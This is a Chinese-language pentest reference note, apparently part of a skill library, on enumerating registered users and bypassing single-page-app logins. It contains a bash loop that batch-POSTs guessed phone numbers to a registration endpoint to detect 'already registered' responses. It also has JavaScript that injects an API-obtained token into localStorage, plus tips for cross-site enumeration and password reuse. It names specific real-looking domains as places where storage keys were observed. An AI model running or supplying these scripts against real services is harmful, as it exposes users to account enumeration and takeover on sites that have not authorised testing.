# 用户枚举 + SPA 认证绕过技术

## 用户枚举 (User Enumeration) via 注册接口

### 原理
许多中文Web应用的注册接口对「已注册」和「未注册」用户返回**不同的错误消息**，可被用于批量枚举有效用户。

### 响应区分模式

| 场景 | 典型响应 | 含义 |
|------|---------|------|
| 手机号已注册 | `{"error":"该手机号已注册"}` | ✅ 有效用户 |
| 手机号未注册 | `{"success":true,"message":"注册成功",...}` | 📝 可创建账号 |
| 通用错误 | `{"error":"参数错误"}` | 可能无法枚举 |

### 批量枚举策略

```bash
# 中国手机号常见前缀
PREFIXES=("139" "138" "137" "136" "135" "188" "187" "186" "185" "150" "151" "152")

for prefix in "${PREFIXES[@]}"; do
  for suffix in "0000" "1234" "8888" "6666" "1000"; do
    phone="${prefix}${suffix}0"
    resp=$(curl -s -X POST "https://target.com/api/user/register" \
      -H "Content-Type: application/json" \
      -d "{\"phone\":\"$phone\",\"password\":\"test123\"}")
    if echo "$resp" | grep -q "已注册"; then
      echo "✅ $phone -> REGISTERED"
    fi
  done
done
```

### 局限性
- 注册接口通常有速率限制（15分钟锁定）
- 需要在两个请求之间间隔合理时间
- 部分应用限制每IP/每手机号的注册频率

---

## SPA 认证绕过 — localStorage 令牌注入

### 原理
许多 Vue/React SPA 将认证令牌（token）存储在 `localStorage` 中，并在页面加载时读取。如果能从 API 层面获取到有效 token，可以直接注入 localStorage 来绕过登录页面。

### 步骤

```javascript
// 1. 通过API登录获取token
const resp = await fetch('/api/?action=login', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({username: 'xxx', password: 'xxx'})
});
const data = await resp.json();
const token = <REDACTED>;

// 2. 注入localStorage（需根据应用的实际key名）
localStorage.setItem('token', token);
localStorage.setItem('account', JSON.stringify(data.data.account));

// 3. 刷新页面即可直接进入后台
location.reload();
```

### 常见 localStorage key 命名模式
| Key 模式 | 示例 | 来源 |
|----------|------|------|
| `token` | jwt令牌 | 通用 |
| `auth_token` | 认证令牌 | 通用 |
| `user` | 用户JSON | 通用 |
| `account` | 账号JSON | pk.yuanfangge.com |
| `userPhone` | 手机号 | app.yuanfangge.com |
| `userPlan` | 套餐名 | app.yuanfangge.com |

### 确定正确 key 名的方法
1. 先正常登录一次（通过API）
2. 在浏览器控制台执行 `Object.keys(localStorage)` 查看所有key
3. 检查每个key的值，找到存储token和用户信息的key

---

## 中文应用常见限速/锁定消息

| 消息原文 | 含义 | 恢复时间 |
|---------|------|---------|
| "尝试次数过多,请 15 分钟后再试" | 登录/注册速率限制 | 15分钟 |
| "登录失败次数过多,请 15 分钟后再试" | 暴力破解防护 | 15分钟 |
| "该手机号已注册" | 用户枚举信号 | — |
| "兑换码无效或已被使用" | 兑换码已用/无效 | — |

---

## 多站点横向枚举

当发现同一品牌有多个子域名时：
1. 在一个站点枚举到的手机号，可能在另一个站点也注册了
2. 一个站点的密码可能在另一个站点复用（但概率较低）
3. 密码重置接口可能在不同站点有不同的安全策略

## See Also
- `references/stateless-vanillajs-spa-auth.md` — for SPAs without tokens/cookies (localStorage-only auth, phone-as-password pattern)
